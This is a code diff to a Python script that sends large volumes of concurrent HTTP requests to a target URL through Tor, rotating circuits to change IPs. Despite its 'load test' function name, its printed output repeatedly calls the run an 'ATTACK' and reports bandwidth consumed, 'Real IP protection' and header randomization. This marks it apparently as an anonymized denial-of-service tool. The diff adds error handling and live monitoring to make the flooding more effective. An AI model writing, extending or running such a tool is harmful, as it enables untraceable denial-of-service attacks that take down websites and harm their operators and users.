@@ -7,6 +7,9 @@ import requests
 import time
 import random
 import subprocess
+import threading
+from collections import defaultdict
+from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from typing import Optional
 from stem import Signal
@@ -137,8 +140,11 @@ def make_request(url: str, method: str = "GET", timeout: int = 10, use_tor: bool
     
     # Rotate IP every N requests (reduced wait time)
     if use_tor and request_num > 0 and request_num % rotate_every == 0:
-        renew_tor_circuit()
-        time.sleep(0.3)  # Minimal wait for new circuit
+        try:
+            renew_tor_circuit()
+            time.sleep(0.3)  # Minimal wait for new circuit
+        except:
+            pass  # Continue even if circuit renewal fails
     
     try:
         # Reuse session if provided, otherwise create new one
@@ -165,22 +171,66 @@ def make_request(url: str, method: str = "GET", timeout: int = 10, use_tor: bool
         
         elapsed = time.time() - start_time
         
-        # Skip IP checking for performance (wastes time and bandwidth)
-        current_ip = "Hidden"
+        # Capture response size
+        response_size = len(response.content) if hasattr(response, 'content') else 0
         
         return {
             "success": True,
             "status_code": response.status_code,
             "elapsed": elapsed,
-            "ip": current_ip
+            "size": response_size,
+            "timestamp": time.time(),
+            "error": None
+        }
+    except requests.exceptions.ProxyError as e:
+        elapsed = time.time() - start_time
+        return {
+            "success": False,
+            "error": f"ProxyError: Tor connection failed - {str(e)[:50]}",
+            "elapsed": elapsed,
+            "size": 0,
+            "timestamp": time.time(),
+            "status_code": 0
+        }
+    except requests.exceptions.ConnectTimeout as e:
+        elapsed = time.time() - start_time
+        return {
+            "success": False,
+            "error": f"ConnectTimeout: Could not reach target - {str(e)[:50]}",
+            "elapsed": elapsed,
+            "size": 0,
+            "timestamp": time.time(),
+            "status_code": 0
+        }
+    except requests.exceptions.ReadTimeout as e:
+        elapsed = time.time() - start_time
+        return {
+            "success": False,
+            "error": f"ReadTimeout: Server too slow to respond - {str(e)[:50]}",
+            "elapsed": elapsed,
+            "size": 0,
+            "timestamp": time.time(),
+            "status_code": 0
+        }
+    except requests.exceptions.ConnectionError as e:
+        elapsed = time.time() - start_time
+        return {
+            "success": False,
+            "error": f"ConnectionError: {str(e)[:60]}",
+            "elapsed": elapsed,
+            "size": 0,
+            "timestamp": time.time(),
+            "status_code": 0
         }
     except Exception as e:
         elapsed = time.time() - start_time
         return {
             "success": False,
-            "error": str(e),
+            "error": f"{type(e).__name__}: {str(e)[:60]}",
             "elapsed": elapsed,
-            "ip": "Hidden"
+            "size": 0,
+            "timestamp": time.time(),
+            "status_code": 0
         }
 
 def run_load_test(url: str, num_requests: int, concurrency: int = 10, method: str = "GET", rotate_every: int = 10):
@@ -223,17 +273,30 @@ def run_load_test(url: str, num_requests: int, concurrency: int = 10, method: st
     print(f"  Speed: MAXIMUM (no artificial delays)")
     print()
     
+    # Enhanced results tracking
     results = {
         "total": 0,
         "success": 0,
         "failed": 0,
         "response_times": [],
-        "status_codes": {}
+        "status_codes": defaultdict(int),
+        "error_types": defaultdict(int),
+        "bytes_sent": 0,
+        "bytes_received": 0,
+        "timeouts": 0,
+        "connection_errors": 0,
+        "requests_per_second": [],
+        "all_results": []
     }
     
+    # Lock for thread-safe updates
+    results_lock = threading.Lock()
+    
     start_time = time.time()
+    last_update = start_time
     
     print(f"💥 Launching {num_requests:,} requests through Tor network...")
+    print("="*80)
     
     # Create persistent sessions for connection pooling
     sessions = []
@@ -251,56 +314,177 @@ def run_load_test(url: str, num_requests: int, concurrency: int = 10, method: st
             for i in range(num_requests)
         ]
         
-        print(f"⚡ Processing responses...")
+        print(f"⚡ Real-time monitoring started...")
+        print(f"{'Time':<8} {'Completed':<12} {'Success':<10} {'Failed':<10} {'Rate/s':<10} {'Avg RT':<10} {'Status':<20}")
+        print("-"*90)
+        
+        completed_count = 0
+        last_error_shown = None
         
         for i, future in enumerate(as_completed(futures), 1):
             result = future.result()
-            results["total"] += 1
             
-            if result["success"]:
-                results["success"] += 1
-                status = result.get("status_code", 0)
-                results["status_codes"][status] = results["status_codes"].get(status, 0) + 1
-            else:
-                results["failed"] += 1
+            with results_lock:
+                results["total"] += 1
+                results["all_results"].append(result)
+                
+                if result["success"]:
+                    results["success"] += 1
+                    status = result.get("status_code", 0)
+                    results["status_codes"][status] += 1
+                    results["bytes_received"] += result.get("size", 0)
+                else:
+                    results["failed"] += 1
+                    error = result.get("error", "Unknown")
+                    
+                    # Categorize errors
+                    if "timeout" in error.lower() or "timed out" in error.lower():
+                        results["timeouts"] += 1
+                        results["error_types"]["Timeout"] += 1
+                    elif "connection" in error.lower() or "refused" in error.lower():
+                        results["connection_errors"] += 1
+                        results["error_types"]["ConnectionError"] += 1
+                    elif "proxy" in error.lower() or "socks" in error.lower():
+                        results["error_types"]["ProxyError"] += 1
+                    else:
+                        error_type = error.split(":")[0] if ":" in error else error[:30]
+                        results["error_types"][error_type] += 1
+                    
+                    # Show first unique error
+                    if last_error_shown != error and results["failed"] <= 3:
+                        print(f"\n⚠️  Error detected: {error[:70]}", flush=True)
+                        last_error_shown = error
+                
+                results["response_times"].append(result["elapsed"])
+                results["bytes_sent"] += 200  # Approximate request size
             
-            results["response_times"].append(result["elapsed"])
+            completed_count += 1
+            current_time = time.time()
             
-            # Print progress
-            if i % 100 == 0 or i == num_requests:
-                elapsed = time.time() - start_time
-                rate = i / elapsed if elapsed > 0 else 0
-                print(f"Progress: {i:,}/{num_requests:,} ({i*100/num_requests:.1f}%) | Rate: {rate:.1f} req/s | Success: {results['success']} | Failed: {results['failed']}", flush=True)
+            # Update display every 0.5 seconds or on last request
+            if current_time - last_update >= 0.5 or i == num_requests:
+                elapsed = current_time - start_time
+                rate = completed_count / elapsed if elapsed > 0 else 0
+                avg_time = sum(results["response_times"]) / len(results["response_times"]) if results["response_times"] else 0
+                
+                # Get most common status code or error
+                if results["status_codes"]:
+                    top_status = max(results["status_codes"].items(), key=lambda x: x[1])
+                    status_display = f"{top_status[0]}({top_status[1]})"
+                elif results["error_types"]:
+                    top_error = max(results["error_types"].items(), key=lambda x: x[1])
+                    status_display = f"ERR:{top_error[0][:12]}"
+                else:
+                    status_display = "N/A"
+                
+                time_str = f"{int(elapsed)}s"
+                completed_str = f"{completed_count:,}/{num_requests:,}"
+                success_str = f"{results['success']:,}"
+                failed_str = f"{results['failed']:,}"
+                rate_str = f"{rate:.1f}"
+                avg_rt_str = f"{avg_time*1000:.0f}ms"
+                
+                print(f"{time_str:<8} {completed_str:<12} {success_str:<10} {failed_str:<10} {rate_str:<10} {avg_rt_str:<10} {status_display:<20}", flush=True)
+                
+                # Early warning if all failing
+                if completed_count >= 50 and results["success"] == 0:
+                    print(f"\n⛔ WARNING: All {completed_count} requests have failed!")
+                    print(f"⛔ Most common error: {max(results['error_types'].items(), key=lambda x: x[1])[0]}")
+                    print(f"⛔ Continuing to collect data, but you may want to Ctrl+C to stop...\n", flush=True)
+                
+                last_update = current_time
     
     total_time = time.time() - start_time
     
-    # Print summary
-    print("\n" + "="*60)
-    print("📊 ATTACK SUMMARY")
-    print("="*60)
-    print(f"Total requests: {results['total']:,}")
-    print(f"✅ Successful: {results['success']:,}")
-    print(f"❌ Failed: {results['failed']:,}")
-    print(f"📈 Success rate: {(results['success']/results['total']*100):.1f}%")
-    print(f"⏱️  Total time: {total_time:.2f}s")
-    print(f"⚡ Attack rate: {results['total']/total_time:.2f} req/s")
-    print(f"💥 Bandwidth consumed: ~{(results['total']*2)/1024:.2f} MB (estimated)")
+    # Calculate additional metrics
+    total_bytes_sent = results["bytes_sent"]
+    total_bytes_received = results["bytes_received"]
+    total_bandwidth = total_bytes_sent + total_bytes_received
     
+    # Print detailed summary
+    print("\n" + "="*80)
+    print("📊 DETAILED ATTACK SUMMARY")
+    print("="*80)
+    
+    # Basic stats
+    print(f"\n🎯 REQUEST STATISTICS:")
+    print(f"  Total requests sent:     {results['total']:,}")
+    print(f"  ✅ Successful:            {results['success']:,} ({results['success']/results['total']*100:.1f}%)")
+    print(f"  ❌ Failed:                {results['failed']:,} ({results['failed']/results['total']*100:.1f}%)")
+    print(f"  ⏱️  Total duration:        {total_time:.2f}s")
+    print(f"  ⚡ Average rate:          {results['total']/total_time:.2f} req/s")
+    print(f"  💥 Peak theoretical:      {concurrency*1000/10:.0f} req/s")
+    
+    # Response time analysis
     if results["response_times"]:
         avg_time = sum(results["response_times"]) / len(results["response_times"])
         min_time = min(results["response_times"])
         max_time = max(results["response_times"])
-        print(f"⏲️  Avg response time: {avg_time*1000:.2f}ms")
-        print(f"⏲️  Min response time: {min_time*1000:.2f}ms")
-        print(f"⏲️  Max response time: {max_time*1000:.2f}ms")
+        sorted_times = sorted(results["response_times"])
+        p50 = sorted_times[len(sorted_times)//2]
+        p95 = sorted_times[int(len(sorted_times)*0.95)]
+        p99 = sorted_times[int(len(sorted_times)*0.99)]
+        
+        print(f"\n⏲️  RESPONSE TIME ANALYSIS:")
+        print(f"  Average:                 {avg_time*1000:.2f}ms")
+        print(f"  Median (p50):            {p50*1000:.2f}ms")
+        print(f"  95th percentile (p95):   {p95*1000:.2f}ms")
+        print(f"  99th percentile (p99):   {p99*1000:.2f}ms")
+        print(f"  Minimum:                 {min_time*1000:.2f}ms")
+        print(f"  Maximum:                 {max_time*1000:.2f}ms")
     
+    # Status code distribution
     if results["status_codes"]:
-        print(f"\n📋 Status code distribution:")
-        for code, count in sorted(results["status_codes"].items()):
-            print(f"   {code}: {count:,} ({count/results['success']*100:.1f}%)")
+        print(f"\n📋 HTTP STATUS CODE DISTRIBUTION:")
+        for code, count in sorted(results["status_codes"].items(), key=lambda x: x[1], reverse=True):
+            percentage = (count/results['success']*100) if results['success'] > 0 else 0
+            bar_length = int(percentage / 2)
+            bar = "█" * bar_length
+            print(f"  {code}: {count:>6,} ({percentage:>5.1f}%) {bar}")
     
-    print(f"\n🔒 Anonymity: MAINTAINED (all traffic through Tor)")
-    print("="*60)
+    # Error analysis
+    if results["error_types"]:
+        print(f"\n❌ ERROR TYPE DISTRIBUTION:")
+        for error_type, count in sorted(results["error_types"].items(), key=lambda x: x[1], reverse=True)[:10]:
+            percentage = (count/results['failed']*100) if results['failed'] > 0 else 0
+            print(f"  {error_type[:40]:<40} {count:>6,} ({percentage:>5.1f}%)")
+        
+        if results["timeouts"]:
+            print(f"\n⏱️  Timeout breakdown:")
+            print(f"  Total timeouts:          {results['timeouts']:,} ({results['timeouts']/results['total']*100:.1f}%)")
+        
+        if results["connection_errors"]:
+            print(f"  Connection errors:       {results['connection_errors']:,} ({results['connection_errors']/results['total']*100:.1f}%)")
+    
+    # Bandwidth analysis
+    print(f"\n📊 BANDWIDTH ANALYSIS:")
+    print(f"  Data sent:               {total_bytes_sent/1024:.2f} KB ({total_bytes_sent/1024/1024:.2f} MB)")
+    print(f"  Data received:           {total_bytes_received/1024:.2f} KB ({total_bytes_received/1024/1024:.2f} MB)")
+    print(f"  Total bandwidth:         {total_bandwidth/1024:.2f} KB ({total_bandwidth/1024/1024:.2f} MB)")
+    print(f"  Average throughput:      {total_bandwidth/1024/total_time:.2f} KB/s")
+    
+    # Success rate over time (last 10% of requests)
+    if len(results["all_results"]) > 10:
+        last_10_percent = results["all_results"][-len(results["all_results"])//10:]
+        last_success = sum(1 for r in last_10_percent if r["success"])
+        recent_success_rate = (last_success / len(last_10_percent) * 100) if last_10_percent else 0
+        print(f"\n📈 PERFORMANCE TREND:")
+        print(f"  Overall success rate:    {results['success']/results['total']*100:.1f}%")
+        print(f"  Recent success rate:     {recent_success_rate:.1f}% (last {len(last_10_percent)} requests)")
+        if recent_success_rate < results['success']/results['total']*100 - 5:
+            print(f"  ⚠️  WARNING: Success rate declining!")
+        elif recent_success_rate > results['success']/results['total']*100 + 5:
+            print(f"  ✅ Success rate improving!")
+    
+    print(f"\n🔒 ANONYMITY STATUS:")
+    print(f"  Tor routing:             ✅ ENABLED")
+    print(f"  Real IP protection:      ✅ ACTIVE")
+    print(f"  Header randomization:    ✅ ACTIVE")
+    print(f"  IP rotation frequency:   Every {rotate_every} requests")
+    
+    print("\n" + "="*80)
+    print(f"Attack completed at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print("="*80)
 
 def main():
     print("=" * 60)
